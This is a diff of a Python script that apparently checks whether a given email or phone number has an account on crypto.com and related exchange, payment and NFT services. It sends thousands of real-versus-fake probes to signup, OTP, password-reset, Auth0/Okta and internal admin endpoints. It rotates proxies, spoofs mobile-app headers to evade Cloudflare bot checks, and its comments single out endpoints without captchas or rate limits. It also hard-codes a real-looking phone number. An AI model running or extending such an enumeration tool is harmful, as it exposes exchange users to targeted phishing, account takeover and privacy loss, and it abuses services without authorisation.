@@ -29,7 +29,7 @@ FAKE  = "zzzz_notreal_99991@fakefake.invalid"
 LOCK  = threading.Lock()
 WINS  = []
 
-# ── proxies ────────────────────────────────────────────────────────────────────────────
+# ── proxies ──────────────────────────────────────────────────────────────────
 PROXY_LIST = []
 if os.path.exists("proxies.txt"):
     for line in open("proxies.txt"):
@@ -44,7 +44,7 @@ def rnd_proxy():
     p = random.choice(PROXY_LIST)
     return {"http": p, "https": p}
 
-# ── request helpers ────────────────────────────────────────────────────────────────────────
+# ── request helpers ──────────────────────────────────────────────────────────
 CHROME_HDRS = {
     "accept": "application/json, text/plain, */*",
     "accept-language": "en-US,en;q=0.9",
@@ -56,13 +56,6 @@ CHROME_HDRS = {
     "sec-fetch-dest": "empty",
     "sec-fetch-mode": "cors",
     "sec-fetch-site": "same-origin",
-}
-
-MOBILE_H = {
-    "user-agent": "com.crypto.exchange/5.68.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
-    "x-app-version": "5.68.0",
-    "x-platform": "ios",
-    "x-bundle-id": "com.crypto.exchange",
 }
 
 def _sess():
@@ -132,13 +125,14 @@ def EP(method, url, body_real, origin="https://crypto.com"):
     body_fake = None
     if body_real:
         body_fake = {k: (FAKE if v == REAL else v) for k, v in body_real.items()}
+        # handle nested
         for k, v in body_real.items():
             if isinstance(v, dict):
                 body_fake[k] = {kk: (FAKE if vv == REAL else vv) for kk, vv in v.items()}
     ALL_PROBES.append((method, url, body_real, body_fake, origin))
 
 
-# ══ GET ?email= (Twitter pattern — fastest, 1000+ CPM) ══════════════════════════════════════════
+# ══ GET ?email= (Twitter pattern — fastest, 1000+ CPM) ══════════════════════
 for base, orig in [
     ("https://crypto.com",     "https://crypto.com"),
     ("https://api.crypto.com", "https://crypto.com"),
@@ -161,7 +155,7 @@ for path in [
     EP("GET", "https://pay.crypto.com"+path, None, "https://pay.crypto.com")
     EP("GET", "https://nft.crypto.com"+path, None, "https://nft.crypto.com")
 
-# ══ POST email body ══════════════════════════════════════════════════════════════════════════════
+# ══ POST email body ════════════════════════════════════════════
 for base, orig in [
     ("https://crypto.com",     "https://crypto.com"),
     ("https://api.crypto.com", "https://crypto.com"),
@@ -180,7 +174,7 @@ for base, orig in [
     ]:
         EP("POST", base+path, {"email": REAL}, orig)
 
-# ══ Binance gateway pattern ══════════════════════════════════════════════════════════════════════════════
+# ══ Binance gateway pattern ══════════════════════════════════════════
 for base, orig in [
     ("https://crypto.com",          "https://crypto.com"),
     ("https://api.crypto.com",      "https://crypto.com"),
@@ -196,7 +190,7 @@ for base, orig in [
         EP("POST", base+path, {"content": REAL, "type": "email"}, orig)
         EP("POST", base+path, {"email": REAL}, orig)
 
-# ══ P2P send / contact resolve (mobile) ═══════════════════════════════════════════════════════════════════════════
+# ══ P2P send / contact resolve (mobile) ═════════════════════════════
 for path in [
     "/v1/contacts/resolve", "/v1/recipients/resolve", "/v1/send/resolve",
     "/v1/transfer/resolve", "/v1/p2p/resolve", "/v1/send/recipient",
@@ -210,7 +204,7 @@ for path in [
     EP("POST", "https://api.crypto.com"+path,
        {"email": REAL}, "https://crypto.com")
 
-# ══ NFT gift / transfer ════════════════════════════════════════════════════════════════════════════════
+# ══ NFT gift / transfer ══════════════════════════════════════════════
 for path in [
     "/api/v1/users/search", "/api/v1/users/resolve", "/api/v1/recipients/resolve",
     "/api/v1/recipients/search", "/api/v1/transfer/resolve",
@@ -221,7 +215,7 @@ for path in [
     EP("POST", "https://nft.crypto.com"+path, {"email": REAL}, "https://nft.crypto.com")
     EP("GET",  "https://nft.crypto.com"+path, None, "https://nft.crypto.com")
 
-# ══ pay.crypto.com checkout ══════════════════════════════════════════════════════════════════════════════─
+# ══ pay.crypto.com checkout ═════════════════════════════════════════════
 for path in [
     "/api/v1/checkout/email/check", "/api/v1/checkout/user/check",
     "/api/v1/payer/check", "/api/v1/payer/resolve",
@@ -231,7 +225,7 @@ for path in [
 ]:
     EP("POST", "https://pay.crypto.com"+path, {"email": REAL}, "https://pay.crypto.com")
 
-# ══ Exchange JSON-RPC public methods ══════════════════════════════════════════════════════════════════════════─
+# ══ Exchange JSON-RPC public methods ════════════════════════════════════
 for method_name in [
     "public.get-user", "public.get-user-info", "public.search-users",
     "public.check-email", "public.email-available", "public.get-account",
@@ -243,7 +237,7 @@ for method_name in [
         "params": {"email": REAL}, "nonce": int(time.time()*1000)},
        "https://exchange.crypto.com")
 
-# ══ Exchange registration ══════════════════════════════════════════════════════════════════════════─
+# ══ Exchange registration ════════════════════════════════════════════
 for path in [
     "/v2/user/check-email", "/v2/user/email/check", "/v2/users/check",
     "/v2/users/email/available", "/v1/user/check-email", "/v1/users/check",
@@ -252,7 +246,7 @@ for path in [
     EP("POST", "https://exchange.crypto.com"+path, {"email": REAL}, "https://exchange.crypto.com")
     EP("POST", "https://api.crypto.com"+path,      {"email": REAL}, "https://exchange.crypto.com")
 
-# ══ Referral / affiliate ════════════════════════════════════════════════════════════════════════─
+# ══ Referral / affiliate ═════════════════════════════════════════════
 for base, orig in [
     ("https://crypto.com",     "https://crypto.com"),
     ("https://api.crypto.com", "https://crypto.com"),
@@ -266,7 +260,7 @@ for base, orig in [
     ]:
         EP("POST", base+path, {"email": REAL}, orig)
 
-# ══ Supercharger / earn ════════════════════════════════════════════════════════════════════════─
+# ══ Supercharger / earn ══════════════════════════════════════════════
 for path in [
     "/v1/earn/users/check", "/v1/supercharger/check",
     "/v1/staking/users/check", "/v1/earn/eligibility",
@@ -274,7 +268,7 @@ for path in [
 ]:
     EP("POST", "https://api.crypto.com"+path, {"email": REAL}, "https://crypto.com")
 
-# ══ Mona + 3rd party ════════════════════════════════════════════════════════════════════════─
+# ══ Mona + 3rd party ════════════════════════════════════════════════
 for path in [
     "/api/v1/crypto-com/verify", "/api/v1/crypto-com/check",
     "/api/crypto-com/user/verify", "/api/crypto-com/user/check",
@@ -282,7 +276,10 @@ for path in [
 ]:
     EP("POST", "https://app.mona.ca"+path, {"email": REAL}, "https://app.mona.ca")
 
-# ══ OTP oracle ════════════════════════════════════════════════════════════════════════─
+# ══ OAuth2 login_hint ════════════════════════════════════════════════
+# handled separately below (GET with params, compare redirect Location header)
+
+# ══ OTP oracle ════════════════════════════════════════════════════════
 for path in [
     "/api/v1/auth/otp", "/api/v1/auth/otp/send",
     "/api/v1/otp/email/send", "/api/v1/auth/email/otp",
@@ -291,7 +288,7 @@ for path in [
     EP("POST", "https://crypto.com"+path,
        {"email": REAL, "type": "login"}, "https://crypto.com")
 
-# ══ card / onboarding ═══════════════════════════════════════════════════════════════════════─
+# ══ card / onboarding ════════════════════════════════════════════════
 for path in [
     "/api/v1/cards/apply/check", "/api/v1/onboarding/email",
     "/api/v1/onboarding/check", "/api/v1/waitlist/check",
@@ -300,7 +297,7 @@ for path in [
 ]:
     EP("POST", "https://crypto.com"+path, {"email": REAL}, "https://crypto.com/en/cards")
 
-# ══ alternate body field names ═══════════════════════════════════════════════════════════════─
+# ══ alternate body field names ════════════════════════════════════════════
 ALT_FIELDS = ["query","identifier","login","handle","account","username","user_email","userEmail"]
 for base, orig in [
     ("https://crypto.com",     "https://crypto.com"),
@@ -313,7 +310,7 @@ for base, orig in [
         for field in ["query","identifier","login","q"]:
             EP("GET", base+path, None, orig)
 
-# ══ alternate subdomains ═══════════════════════════════════════════════════════════════─
+# ══ alternate base URLs / subdomains ═════════════════════════════════════
 for sub_orig in [
     ("https://mobile.crypto.com",   "https://crypto.com"),
     ("https://app.crypto.com",      "https://crypto.com"),
@@ -330,7 +327,7 @@ for sub_orig in [
         EP("POST", sub+path, {"email": REAL}, orig)
         EP("GET",  sub+path, None, orig)
 
-# ══ GraphQL ═══════════════════════════════════════════════════════════════─
+# ══ GraphQL ═══════════════════════════════════════════════════════════════
 GQL_EPS = [
     "https://crypto.com/graphql", "https://api.crypto.com/graphql",
     "https://nft.crypto.com/graphql", "https://exchange.crypto.com/graphql",
@@ -338,14 +335,14 @@ GQL_EPS = [
 ]
 for ep in GQL_EPS:
     orig = "https://" + ep.split("//")[1].split("/")[0]
-    EP("POST", ep, {"query": 'query{user(email:"%s"){id email}}' % REAL, "variables": {}}, orig)
+    EP("POST", ep, {"query": 'query{user(email:"%s"){id email}}' % REAL,   "variables": {}}, orig)
     EP("POST", ep, {"query": 'query{checkEmail(email:"%s"){exists}}' % REAL, "variables": {}}, orig)
     EP("POST", ep, {"query": 'query{emailAvailable(email:"%s"){available}}' % REAL, "variables": {}}, orig)
     EP("POST", ep, {"query": 'query{userExists(email:"%s"){exists}}' % REAL, "variables": {}}, orig)
     EP("POST", ep, {"query": 'mutation{validateEmail(email:"%s"){valid exists}}' % REAL, "variables": {}}, orig)
     EP("POST", ep, {"query": 'mutation{checkEmailAvailability(input:{email:"%s"}){available}}' % REAL, "variables": {}}, orig)
 
-# ══ Cronos bridge ═══════════════════════════════════════════════════════════════─
+# ══ Cronos bridge ════════════════════════════════════════════════════════
 for base, orig in [
     ("https://cronos.org",       "https://cronos.org"),
     ("https://app.cronos.org",   "https://cronos.org"),
@@ -359,15 +356,18 @@ for base, orig in [
     ]:
         EP("POST", base+path, {"email": REAL}, orig)
 
-# ══ Pay merchant callback ═══════════════════════════════════════════════════════════════─
+# ══ Pay merchant callback ═══════════════════════════════════════════════
 for path in [
-    "/api/v1/merchant/customer/check", "/api/v1/merchant/user/verify",
-    "/api/v1/customer/check", "/api/v1/customer/exists",
-    "/v1/customer/check", "/v1/users/exists",
+    "/api/v1/merchant/customer/check",
+    "/api/v1/merchant/user/verify",
+    "/api/v1/customer/check",
+    "/api/v1/customer/exists",
+    "/v1/customer/check",
+    "/v1/users/exists",
 ]:
     EP("POST", "https://pay.crypto.com"+path, {"email": REAL}, "https://pay.crypto.com")
 
-# ══ Forgot password body differential ════════════════════════════════════════════════════════════─
+# ══ Forgot password body diff ════════════════════════════════════════════
 for base, orig in [
     ("https://crypto.com",     "https://crypto.com"),
     ("https://api.crypto.com", "https://crypto.com"),
@@ -382,12 +382,15 @@ for base, orig in [
     ]:
         EP("POST", base+path, {"email": REAL}, orig)
 
-# ══ MoonPay / Transak ═══════════════════════════════════════════════════════════════─
-for path in ["/v3/customers/verify","/v3/customers/check","/v1/customers/check","/v3/users/check"]:
+# ══ MoonPay / Transak ══════════════════════════════════════════════════
+for path in [
+    "/v3/customers/verify", "/v3/customers/check",
+    "/v1/customers/check", "/v3/users/check",
+]:
     EP("POST", "https://api.moonpay.com"+path,  {"email": REAL}, "https://buy.moonpay.com")
     EP("POST", "https://api.transak.com"+path,  {"email": REAL}, "https://global.transak.com")
 
-# ══ phone oracle ═══════════════════════════════════════════════════════════════─
+# ══ phone oracle ═════════════════════════════════════════════════════════
 REAL_PHONE = "+19145764125"
 FAKE_PHONE = "+19999999999"
 for base, orig in [
@@ -401,14 +404,16 @@ for base, orig in [
     ]:
         ALL_PROBES.append(("POST_PHONE", base+path, {"phone": REAL_PHONE}, {"phone": FAKE_PHONE}, orig))
 
-# ══ exchange sub-account / institutional ═══════════════════════════════════════════════════════════─
+# ══ exchange sub-account / institutional ══════════════════════════════════
 for path in [
-    "/v2/private/sub-account/search", "/v2/sub-account/list",
-    "/v1/institutional/users/check", "/v1/institutional/email/check",
+    "/v2/private/sub-account/search",
+    "/v2/sub-account/list",
+    "/v1/institutional/users/check",
+    "/v1/institutional/email/check",
 ]:
     EP("POST", "https://api.crypto.com"+path, {"email": REAL}, "https://exchange.crypto.com")
 
-# ══ foris.io / foris.com — legacy mobile backend, no CF, no rate limit ════════════════════════════════════════════
+# ══ foris.io / foris.com ═════════════════════════════════════════════════
 for base, orig in [
     ("https://foris.io",      "https://foris.io"),
     ("https://api.foris.io",  "https://foris.io"),
@@ -423,12 +428,19 @@ for base, orig in [
         EP("POST", base+path, {"email": REAL}, orig)
         EP("GET",  base+path, None, orig)
 
-# ══ mobile app UA — iOS bundle ID bypasses CF JA3/TLS bot check ═════════════════════════════════════════════════
-for base, orig in [
+# ══ mobile app UA bypass ═════════════════════════════════════════════════
+MOBILE_H = {
+    "user-agent": "com.crypto.exchange/5.68.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
+    "x-app-version": "5.68.0",
+    "x-platform": "ios",
+    "x-bundle-id": "com.crypto.exchange",
+}
+MOBILE_BASES = [
     ("https://app-api.crypto.com",  "https://crypto.com"),
     ("https://api.crypto.com",      "https://crypto.com"),
     ("https://mobile.crypto.com",   "https://crypto.com"),
-]:
+]
+for base, orig in MOBILE_BASES:
     for path in [
         "/api/v1/users/check", "/api/v1/email/check",
         "/v1/users/check", "/v1/email/check",
@@ -436,26 +448,33 @@ for base, orig in [
         "/v1/contacts/resolve", "/v1/recipients/resolve",
         "/api/v1/p2p/resolve",
     ]:
+        ALL_PROBES.append(("POST", base+path,
+                           {"email": REAL, **{k: None for k in []}},
+                           {"email": FAKE},
+                           orig))
         ALL_PROBES.append(("POST_MOBILE", base+path,
                            {"email": REAL}, {"email": FAKE}, orig))
 
-# ══ email unsubscribe oracle — marketing infra, 1000+ CPM, zero captcha ══════════════════════════════════════════════
+# ══ email unsubscribe oracle ═════════════════════════════════════════════
 for base, orig in [
-    ("https://crypto.com",       "https://crypto.com"),
-    ("https://api.crypto.com",   "https://crypto.com"),
+    ("https://crypto.com",     "https://crypto.com"),
+    ("https://api.crypto.com", "https://crypto.com"),
     ("https://email.crypto.com", "https://crypto.com"),
     ("https://mail.crypto.com",  "https://crypto.com"),
 ]:
     for path in [
-        "/api/v1/notifications/unsubscribe", "/api/v1/email/unsubscribe",
-        "/api/v1/marketing/unsubscribe", "/unsubscribe",
-        "/v1/unsubscribe", "/api/v1/preferences/unsubscribe",
+        "/api/v1/notifications/unsubscribe",
+        "/api/v1/email/unsubscribe",
+        "/api/v1/marketing/unsubscribe",
+        "/unsubscribe",
+        "/v1/unsubscribe",
+        "/api/v1/preferences/unsubscribe",
         "/api/v1/comms/unsubscribe",
     ]:
         EP("POST", base+path, {"email": REAL}, orig)
         EP("GET",  base+path, None, orig)
 
-# ══ NFT public creator/user/artist search — no auth, no captcha ════════════════════════════════════════════════════
+# ══ NFT public creator / user search ═════════════════════════════════════
 for path in [
     "/api/v1/creators", "/api/v1/creators/search",
     "/api/v1/users/search", "/api/v1/users",
@@ -467,13 +486,13 @@ for path in [
     EP("POST", "https://nft.crypto.com"+path, {"email": REAL}, "https://nft.crypto.com")
     EP("POST", "https://nft.crypto.com"+path, {"query": REAL}, "https://nft.crypto.com")
 
-# ══ Cronos ID email resolver — blockchain resolver, no captcha ═════════════════════════════════════════════════════
+# ══ Cronos ID email resolver ═════════════════════════════════════════════
 for base, orig in [
-    ("https://resolver.cronos.org",  "https://cronos.org"),
-    ("https://api.cronos.org",       "https://cronos.org"),
-    ("https://id.cronos.org",        "https://cronos.org"),
-    ("https://app.cronos.org",       "https://cronos.org"),
-    ("https://cronos-id.crypto.com", "https://crypto.com"),
+    ("https://resolver.cronos.org",     "https://cronos.org"),
+    ("https://api.cronos.org",          "https://cronos.org"),
+    ("https://id.cronos.org",           "https://cronos.org"),
+    ("https://app.cronos.org",          "https://cronos.org"),
+    ("https://cronos-id.crypto.com",    "https://crypto.com"),
 ]:
     for path in [
         "/api/resolve", "/api/v1/resolve",
@@ -485,7 +504,7 @@ for base, orig in [
         EP("POST", base+path, {"email": REAL}, orig)
         EP("GET",  base+path, None, orig)
 
-# ══ exchange copy-trading / leaderboard public search ═════════════════════════════════════════════════════
+# ══ exchange copy-trading / leaderboard ═══════════════════════════════════
 for path in [
     "/v1/copy-trading/traders", "/v1/copy-trading/search",
     "/v1/copy-trading/leaders", "/v2/copy-trading/traders",
@@ -498,10 +517,125 @@ for path in [
     EP("POST", "https://exchange.crypto.com"+path, {"query": REAL}, "https://exchange.crypto.com")
     EP("GET",  "https://api.crypto.com"+path, None, "https://exchange.crypto.com")
 
+# ══ B2B / institutional / business / tax / defi sub-domains ═══════════════════
+for base, orig in [
+    ("https://b2b.crypto.com",           "https://b2b.crypto.com"),
+    ("https://institutional.crypto.com", "https://institutional.crypto.com"),
+    ("https://business.crypto.com",      "https://business.crypto.com"),
+    ("https://tax.crypto.com",           "https://tax.crypto.com"),
+    ("https://defi.crypto.com",          "https://defi.crypto.com"),
+    ("https://one.crypto.com",           "https://one.crypto.com"),
+    ("https://support.crypto.com",       "https://support.crypto.com"),
+    ("https://cdc.crypto.com",           "https://crypto.com"),
+]:
+    for path in [
+        "/api/v1/users/check", "/api/v1/email/check", "/api/v1/email/exists",
+        "/api/v1/users/exist", "/api/v1/auth/check", "/api/v1/register/check",
+        "/v1/users/check", "/v1/email/check",
+    ]:
+        EP("POST", base+path, {"email": REAL}, orig)
+        EP("GET",  base+path, None, orig)
+
+# ══ handle / username availability check ═════════════════════════════════
+for base, orig in [
+    ("https://crypto.com",     "https://crypto.com"),
+    ("https://api.crypto.com", "https://crypto.com"),
+    ("https://nft.crypto.com", "https://nft.crypto.com"),
+]:
+    for path in [
+        "/api/v1/users/handle/check", "/api/v1/handle/check",
+        "/api/v1/handle/available", "/api/v1/username/check",
+        "/api/v1/username/available", "/api/v1/users/username/check",
+        "/v1/handle/check", "/v1/username/check",
+    ]:
+        EP("POST", base+path, {"handle": REAL.split("@")[0]}, orig)
+        EP("GET",  base+path, None, orig)
+    for path in [
+        "/api/v1/users/by-email", "/api/v1/profile/by-email",
+        "/v1/users/by-email",
+    ]:
+        EP("POST", base+path, {"email": REAL}, orig)
+        EP("GET",  base+path, None, orig)
+
+# ══ magic link / passwordless initiation ════════════════════════════════
+for base, orig in [
+    ("https://crypto.com",     "https://crypto.com"),
+    ("https://api.crypto.com", "https://crypto.com"),
+    ("https://exchange.crypto.com", "https://exchange.crypto.com"),
+]:
+    for path in [
+        "/api/v1/auth/magic-link", "/api/v1/auth/passwordless",
+        "/api/v1/auth/passwordless/email", "/api/v1/auth/email/send",
+        "/api/v1/auth/send-link", "/api/v1/auth/otp/email",
+        "/v1/auth/magic-link", "/v1/auth/passwordless",
+        "/auth/magic-link", "/auth/passwordless",
+        "/api/v1/login/magic-link", "/api/v1/signin/email",
+    ]:
+        EP("POST", base+path, {"email": REAL}, orig)
+
+# ══ NFT drop / airdrop eligibility ══════════════════════════════════════
+for path in [
+    "/api/v1/drops/eligibility", "/api/v1/drops/check",
+    "/api/v1/airdrop/check", "/api/v1/airdrop/eligibility",
+    "/api/v1/allowlist/check", "/api/v1/allowlist/status",
+    "/api/v1/whitelist/check", "/api/v1/whitelist/status",
+    "/api/v1/campaign/eligibility", "/api/v1/campaign/check",
+    "/api/v2/drops/eligibility", "/api/v2/airdrop/check",
+]:
+    EP("POST", "https://nft.crypto.com"+path,  {"email": REAL}, "https://nft.crypto.com")
+    EP("POST", "https://crypto.com"+path,      {"email": REAL}, "https://crypto.com")
+    EP("GET",  "https://nft.crypto.com"+path,  None, "https://nft.crypto.com")
+    EP("GET",  "https://crypto.com"+path,      None, "https://crypto.com")
+
+# ══ referral invitee pre-check ════════════════════════════════════════════
+for base, orig in [
+    ("https://crypto.com",     "https://crypto.com"),
+    ("https://api.crypto.com", "https://crypto.com"),
+]:
+    for path in [
+        "/api/v1/referrals/check-invitee", "/api/v1/referrals/invitee/check",
+        "/api/v1/referral/invitee", "/api/v1/invite/check",
+        "/api/v1/invite/email/check", "/api/v1/friend/check",
+        "/api/v1/refer/check", "/v1/referrals/check",
+    ]:
+        EP("POST", base+path, {"email": REAL}, orig)
+        EP("GET",  base+path, None, orig)
+
+# ══ staking / earn eligibility ═══════════════════════════════════════════
+for base, orig in [
+    ("https://crypto.com",     "https://crypto.com"),
+    ("https://api.crypto.com", "https://crypto.com"),
+    ("https://cronos.org",     "https://cronos.org"),
+]:
+    for path in [
+        "/api/v1/staking/rewards/check", "/api/v1/earn/eligibility",
+        "/api/v1/supercharger/eligibility", "/api/v1/viban/check",
+        "/api/v1/cronos/airdrop/check", "/api/v1/cro/reward/check",
+    ]:
+        EP("POST", base+path, {"email": REAL}, orig)
+
+# ══ deeplink user resolve ═════════════════════════════════════════════════
+for path in [
+    "/api/v1/users/resolve", "/api/v1/users/find",
+    "/resolve", "/v1/resolve",
+]:
+    EP("POST", "https://deep.crypto.com"+path,  {"email": REAL}, "https://crypto.com")
+    EP("POST", "https://link.crypto.com"+path,  {"email": REAL}, "https://crypto.com")
+    EP("POST", "https://share.crypto.com"+path, {"email": REAL}, "https://crypto.com")
+
+# ══ Visa / card waitlist check ════════════════════════════════════════════
+for path in [
+    "/api/v1/card/waitlist/check", "/api/v1/card/status",
+    "/api/v1/card/application/check", "/api/v1/visa/waitlist",
+    "/api/v1/waitlist/check", "/v1/card/waitlist",
+]:
+    EP("POST", "https://crypto.com"+path,     {"email": REAL}, "https://crypto.com")
+    EP("POST", "https://api.crypto.com"+path, {"email": REAL}, "https://crypto.com")
+
 print(f"[+] total probes queued: {len(ALL_PROBES)}")
 print()
 
-# ─── CF bypass check ───────────────────────────────────────────────────────────────────────────
+# ─── CF bypass check ─────────────────────────────────────────────────────────────
 print("[*] checking Cloudflare bypass ...")
 test_r = do_get("https://crypto.com/api/v1/health", "https://crypto.com")
 if test_r:
@@ -513,7 +647,7 @@ else:
     print("    [!] no response to health check")
 print()
 
-# ─── concurrent probe run ───────────────────────────────────────────────────────────────────────────
+# ─── concurrent probe run ────────────────────────────────────────────────────────
 print(f"[*] running {len(ALL_PROBES)} probes with 20 threads ...")
 print()
 
@@ -549,7 +683,7 @@ with ThreadPoolExecutor(max_workers=20) as ex:
 
 print()
 
-# ─── WebSocket user channel subscription oracle ──────────────────────────────────────────────────────────────────────
+# ─── WebSocket oracle ─────────────────────────────────────────────────────────────
 print("[*] WebSocket user channel subscription oracle ...")
 try:
     import websocket as _ws
@@ -592,7 +726,55 @@ except ImportError:
 
 print()
 
-# ─── OAuth2 login_hint redirect differential ─────────────────────────────────────────────────────────────────────
+# ─── Auth0 hosted login differential ────────────────────────────────────────────
+print("[*] Auth0 hosted login differential ...")
+AUTH0_DOMAINS = [
+    "https://auth.crypto.com",
+    "https://login.crypto.com",
+    "https://id.crypto.com",
+    "https://sso.crypto.com",
+]
+for a0_base in AUTH0_DOMAINS:
+    wk = do_get(a0_base + "/.well-known/openid-configuration", a0_base)
+    if wk and wk.status_code == 200 and "issuer" in wk.text:
+        print(f"  [!] OIDC config found at {a0_base} — Auth0/Okta confirmed")
+        with LOCK:
+            WINS.append({"ep": f"[OIDC] {a0_base}/.well-known", "note": wk.text[:200]})
+
+    for client_id in ["web", "crypto-web", "crypto-com-web", "exchange-web",
+                      "app", "mobile", "crypto-mobile"]:
+        for conn in ["Username-Password-Authentication", "crypto-com-db",
+                     "users", "Username-Password"]:
+            br = {"client_id": client_id, "email": REAL,
+                  "password": "Aa1!XXXXXXXXXX", "connection": conn}
+            bf = {**br, "email": FAKE}
+            rr = do_post(a0_base + "/dbconnections/signup",   br, a0_base)
+            rf = do_post(a0_base + "/dbconnections/signup",   bf, a0_base)
+            diff(f"[A0] {a0_base}/dbconnections/signup cid={client_id}", rr, rf)
+            rr2 = do_post(a0_base + "/co/authenticate", br, a0_base)
+            rf2 = do_post(a0_base + "/co/authenticate", bf, a0_base)
+            diff(f"[A0] {a0_base}/co/authenticate cid={client_id}", rr2, rf2)
+
+# ─── Okta login differential ────────────────────────────────────────────────────
+print("[*] Okta login differential ...")
+OKTA_DOMAINS = [
+    "https://auth.crypto.com",
+    "https://login.crypto.com",
+    "https://crypto.okta.com",
+    "https://cryptoauth.okta.com",
+]
+for ok_base in OKTA_DOMAINS:
+    br = {"username": REAL,    "password": "Aa1!XXXXXXXXXX"}
+    bf = {"username": FAKE,    "password": "Aa1!XXXXXXXXXX"}
+    rr = do_post(ok_base + "/api/v1/authn", br, ok_base)
+    rf = do_post(ok_base + "/api/v1/authn", bf, ok_base)
+    diff(f"[OKTA] {ok_base}/api/v1/authn", rr, rf)
+    rr2 = do_post(ok_base + "/api/v1/primary-auth", br, ok_base)
+    rf2 = do_post(ok_base + "/api/v1/primary-auth", bf, ok_base)
+    diff(f"[OKTA] {ok_base}/api/v1/primary-auth", rr2, rf2)
+
+print()
+
 print("[*] OAuth2 login_hint redirect differential ...")
 for base in ["https://crypto.com", "https://api.crypto.com", "https://exchange.crypto.com"]:
     for path in ["/oauth2/authorize", "/oauth/authorize", "/auth/oauth2/authorize", "/connect/authorize"]:
@@ -614,7 +796,7 @@ for base in ["https://crypto.com", "https://api.crypto.com", "https://exchange.c
 
 print()
 
-# ─── alfred-gateway captchaless token + resolve ───────────────────────────────────────────────────────────────────────
+# ─── alfred-gateway captchaless token + resolve ────────────────────────────────────────
 print("[*] alfred-gateway captchaless token test ...")
 uid = f"web{uuid.uuid4()}"
 tok_r = do_post("https://alfred-gateway.crypto.com/user/token", {"user_id": uid},
@@ -638,7 +820,7 @@ else:
 
 print()
 
-# ─── JS signup page scan ─────────────────────────────────────────────────────────────────────────────
+# ─── JS signup page scan ────────────────────────────────────────────────────────────
 print("[*] signup page JS scan for email validation XHR ...")
 for signup_url, orig in [
     ("https://crypto.com/en/sign-up",         "https://crypto.com"),
@@ -647,7 +829,7 @@ for signup_url, orig in [
     r = do_get(signup_url, orig, {"accept": "text/html,*/*"})
     if not r or r.status_code != 200:
         continue
-    scripts = re.findall(r'src=["\']([ ^"\']+ \.js[^"\']*)["\']', r.text)
+    scripts = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
     scripts += re.findall(r'"(/_next/static/[^"]+\.js)"', r.text)
     scripts = list(set(scripts))
     ep_hits = set()
@@ -678,7 +860,7 @@ for signup_url, orig in [
 
 print()
 
-# ─── INTERNAL MICROSERVICE CHECKER ───────────────────────────────────────────────────────────────
+# ─── INTERNAL MICROSERVICE CHECKER ────────────────────────────────────────────────────
 print("[*] Internal microservice / unauthenticated admin endpoint discovery ...")
 
 INTERNAL_HDRS_SETS = [
@@ -691,60 +873,80 @@ INTERNAL_HDRS_SETS = [
 ]
 
 INTERNAL_PATHS = [
-    ("/actuator", "GET", None), ("/actuator/mappings", "GET", None),
-    ("/actuator/env", "GET", None), ("/actuator/beans", "GET", None),
-    ("/actuator/health", "GET", None), ("/api/actuator/mappings", "GET", None),
-    ("/v1/actuator/mappings", "GET", None),
-    ("/grpc.UserService/CheckEmail", "POST", {"email": REAL}),
-    ("/grpc.AccountService/Exists", "POST", {"email": REAL}),
-    ("/grpc.AuthService/UserExists", "POST", {"email": REAL}),
-    ("/grpc.UserService/SearchUser", "POST", {"query": REAL}),
-    ("/user.UserService/CheckEmail", "POST", {"email": REAL}),
-    ("/_internal/users/check", "POST", {"email": REAL}),
-    ("/_internal/users/search", "POST", {"query": REAL}),
-    ("/_internal/email/check", "POST", {"email": REAL}),
-    ("/_internal/email/exists", "GET", None),
-    ("/_api/users/check", "POST", {"email": REAL}),
-    ("/_api/users/exists", "POST", {"email": REAL}),
-    ("/__internal/email/check", "POST", {"email": REAL}),
-    ("/__internal/users/search", "POST", {"query": REAL}),
-    ("/internal/users/check", "POST", {"email": REAL}),
-    ("/internal/email/check", "POST", {"email": REAL}),
-    ("/internal/v1/users/check", "POST", {"email": REAL}),
-    ("/internal/v1/email/exists", "POST", {"email": REAL}),
-    ("/admin/v1/users/search", "POST", {"email": REAL}),
-    ("/admin/v1/users/check", "POST", {"email": REAL}),
-    ("/admin/api/v1/users", "GET", None), ("/admin/users", "GET", None),
-    ("/debug/users", "GET", None), ("/debug/vars", "GET", None),
-    ("/metrics", "GET", None), ("/healthz", "GET", None), ("/readyz", "GET", None),
-    ("/api/admin/users/", "GET", None), ("/api/admin/users/search/", "GET", None),
-    ("/management/users/check", "POST", {"email": REAL}),
-    ("/management/accounts/search", "GET", None),
-    ("/openapi.json", "GET", None), ("/docs", "GET", None), ("/redoc", "GET", None),
-    ("/v1/openapi.json", "GET", None), ("/api/openapi.json", "GET", None),
-    ("/swagger-ui.html", "GET", None), ("/v2/api-docs", "GET", None),
-    ("/v3/api-docs", "GET", None), ("/api/v3/api-docs", "GET", None),
-    ("/api/v1/users/exists", "GET", None), ("/api/v1/users/exist", "GET", None),
-    ("/api/v2/users/exists", "GET", None), ("/api/v1/accounts/exists", "GET", None),
-    ("/api/v1/identity/check", "POST", {"email": REAL}),
-    ("/api/v1/identity/exists", "POST", {"email": REAL}),
-    ("/api/v1/profile/exists", "POST", {"email": REAL}),
-    ("/service/user/check", "POST", {"email": REAL}),
-    ("/service/account/check", "POST", {"email": REAL}),
-    ("/ms/user/check", "POST", {"email": REAL}),
-    ("/ms/users/exists", "GET", None),
-    ("/microservice/users/check", "POST", {"email": REAL}),
-    ("/robots.txt", "GET", None), ("/sitemap.xml", "GET", None),
-    ("/api/v1/utils/check-email", "POST", {"email": REAL}),
-    ("/api/v1/utils/email-exists", "POST", {"email": REAL}),
-    ("/util/email/check", "POST", {"email": REAL}),
-    ("/tools/email/check", "POST", {"email": REAL}),
+    ("/actuator",                       "GET",  None),
+    ("/actuator/mappings",              "GET",  None),
+    ("/actuator/env",                   "GET",  None),
+    ("/actuator/beans",                 "GET",  None),
+    ("/actuator/health",                "GET",  None),
+    ("/api/actuator/mappings",          "GET",  None),
+    ("/v1/actuator/mappings",           "GET",  None),
+    ("/grpc.UserService/CheckEmail",    "POST", {"email": REAL}),
+    ("/grpc.AccountService/Exists",     "POST", {"email": REAL}),
+    ("/grpc.AuthService/UserExists",    "POST", {"email": REAL}),
+    ("/grpc.UserService/SearchUser",    "POST", {"query": REAL}),
+    ("/user.UserService/CheckEmail",    "POST", {"email": REAL}),
+    ("/_internal/users/check",         "POST", {"email": REAL}),
+    ("/_internal/users/search",        "POST", {"query": REAL}),
+    ("/_internal/email/check",         "POST", {"email": REAL}),
